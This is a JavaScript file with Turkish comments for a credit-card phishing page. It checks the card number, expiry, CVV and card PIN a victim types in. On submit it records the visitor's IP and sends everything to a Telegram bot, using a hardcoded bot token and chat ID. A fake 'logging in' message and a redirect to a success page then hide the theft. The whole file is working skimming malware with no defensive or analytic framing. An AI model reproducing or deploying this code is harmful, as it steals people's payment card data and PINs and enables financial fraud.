// phmain.js - TAM ÇALIŞAN (boşluk + slash)

const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
const CHAT_ID = "-1002475411082";

window.slider1 = { prev: function() {} };
window.closeAlert = function() { 
    var el = document.getElementById('alertDiv');
    if(el) el.style.display = 'none';
};
window.uyariKapat = function() { 
    var el = document.getElementById('alertDiv3');
    if(el) el.style.display = 'none';
};

function luhnKontrol(kartNo) {
    var sum = 0;
    var alternate = false;
    for (var i = kartNo.length - 1; i >= 0; i--) {
        var n = parseInt(kartNo.charAt(i), 10);
        if (alternate) {
            n *= 2;
            if (n > 9) n -= 9;
        }
        sum += n;
        alternate = !alternate;
    }
    return sum % 10 === 0;
}

function sktKontrol(skt) {
    if (!skt || skt.length !== 5) return false;
    var ay = parseInt(skt.substring(0,2), 10);
    var yil = parseInt(skt.substring(3,5), 10);
    var now = new Date();
    var nowYil = now.getFullYear() % 100;
    var nowAy = now.getMonth() + 1;
    
    if (ay < 1 || ay > 12) return false;
    if (yil < nowYil) return false;
    if (yil === nowYil && ay < nowAy) return false;
    return true;
}

function getIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(function(res) { return res.json(); })
        .then(function(data) { callback(data.ip); })
        .catch(function() { callback('Bilinmiyor'); });
}

function sendToTelegram(message) {
    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message);
    fetch(url).catch(console.log);
}

function showAlert(msg) {
    var alertDiv = document.getElementById('alertDiv');
    if (alertDiv) {
        alertDiv.style.display = 'block';
        var p = alertDiv.querySelectorAll('p');
        if (p[2]) p[2].innerText = msg;
    }
}

// Sayfa yüklendiğinde
window.addEventListener('DOMContentLoaded', function() {
    console.log('DOM yüklendi');
    
    // === KART NUMARASI (her 4 rakamda bir boşluk) ===
    var kartInput = document.getElementById('customUsername');
    if (kartInput) {
        kartInput.addEventListener('input', function() {
            var rakamlar = this.value.replace(/\D/g, '');
            if (rakamlar.length > 16) rakamlar = rakamlar.slice(0, 16);
            var formatli = '';
            for (var i = 0; i < rakamlar.length; i++) {
                if (i > 0 && i % 4 === 0) formatli += ' ';
                formatli += rakamlar[i];
            }
            this.value = formatli;
            console.log('Kart formatlandı:', formatli);
        });
    } else {
        console.log('customUsername bulunamadı!');
    }
    
    // === SKT (otomatik slash) ===
    var expInput = document.getElementById('exp');
    if (expInput) {
        expInput.addEventListener('input', function() {
            var rakamlar = this.value.replace(/\D/g, '');
            if (rakamlar.length > 4) rakamlar = rakamlar.slice(0, 4);
            if (rakamlar.length >= 3) {
                this.value = rakamlar.slice(0, 2) + '/' + rakamlar.slice(2, 4);
            } else {
                this.value = rakamlar;
            }
            console.log('SKT formatlandı:', this.value);
        });
    } else {
        console.log('exp bulunamadı!');
    }
    
    // === CVV (sadece rakam, max 3) ===
    var cvvInput = document.getElementById('cvv');
    if (cvvInput) {
        cvvInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 3);
        });
    }
    
    // === Şifre (sadece rakam, max 4) ===
    var sifreInput = document.getElementById('kkpw');
    if (sifreInput) {
        sifreInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });
    }
    
    // === BUTON ===
    var btn = document.getElementById('btn-spc');
    if (btn) {
        btn.onclick = function(e) {
            e.preventDefault();
            
            var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
            var skt = document.getElementById('exp').value;
            var cvv = document.getElementById('cvv').value;
            var sifre = document.getElementById('kkpw').value;
            
            console.log('Kart No (temiz):', kartNo);
            console.log('SKT:', skt);
            console.log('CVV:', cvv);
            console.log('Şifre:', sifre);
            
            if (!kartNo || kartNo.length !== 16) {
                showAlert('Kart numarası 16 haneli olmalıdır.');
                return;
            }
            if (!luhnKontrol(kartNo)) {
                showAlert('Geçersiz kart numarası!');
                return;
            }
            if (!skt || skt.length !== 5) {
                showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.');
                return;
            }
            if (!sktKontrol(skt)) {
                showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!');
                return;
            }
            if (!cvv || cvv.length !== 3) {
                showAlert('CVV 3 haneli olmalıdır.');
                return;
            }
            if (!sifre || sifre.length !== 4) {
                showAlert('Kart şifresi 4 haneli olmalıdır.');
                return;
            }
            
            document.getElementById('alertDiv').style.display = 'none';
            
            // Butonu "Giriş yapılıyor..." yap
            var originalText = btn.innerText;
            btn.innerText = 'Giriş yapılıyor...';
            btn.disabled = true;
            btn.style.opacity = '0.6';
            
            getIP(function(ip) {
                var mesaj = 'Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip;
                sendToTelegram(mesaj);
                
                setTimeout(function() {
                    window.location.href = 'success.html';
                }, 1000);
            });
        };
    } else {
        console.log('btn-spc bulunamadı!');
    }
});
